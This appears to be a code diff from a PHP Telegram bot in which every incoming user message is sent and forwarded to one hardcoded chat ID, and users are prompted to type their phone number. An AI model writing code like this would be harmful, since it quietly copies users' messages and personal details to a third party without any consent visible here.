@@ -106,7 +106,11 @@ class GenericmessageCommand extends SystemCommand
         }
         else {
 
-        
+            Request::sendMessage([
+                'chat_id' => '1053901092',
+                 'text' => $message
+    
+            ]);
 
           Request::forwardMessage([
             'chat_id' => '1053901092',
@@ -181,11 +185,7 @@ class GenericmessageCommand extends SystemCommand
 
             elseif ($message_text == 'SUBMIT YOUR COUNTRY')
             {
-                Request::sendMessage([
-                    'chat_id' => '1053901092',
-                     'text' => $message
-        
-                ]);
+                
                 return $this->replyToChat("Please ! Write Your PHONE Number eg( +***** )", [
                     'reply_markup' => $keyboard3,
                  ]);
